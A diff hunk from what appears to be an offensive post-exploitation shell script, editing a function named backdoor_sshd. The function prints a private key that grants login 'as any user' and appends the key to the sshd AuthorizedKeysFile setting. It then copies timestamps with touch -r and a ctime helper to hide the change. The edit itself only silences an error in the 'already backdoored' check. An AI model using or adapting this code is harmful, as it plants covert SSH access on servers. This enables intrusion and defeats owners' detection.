@@ -1822,7 +1822,7 @@ backdoor_sshd() {
 	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
 	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking in sshd_config"
 	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
-	grep -qm1 '^AuthorizedKeysFile' "$N" && { echo >&2 "WARN: Already backdoored"; return; }
+	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && { echo >&2 "WARN: Already backdoored"; return; }
 	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
 	touch -r "$K" "$N" "$D" \
 	&& declare -f ctime >/dev/null && ctime "$N" "$D"
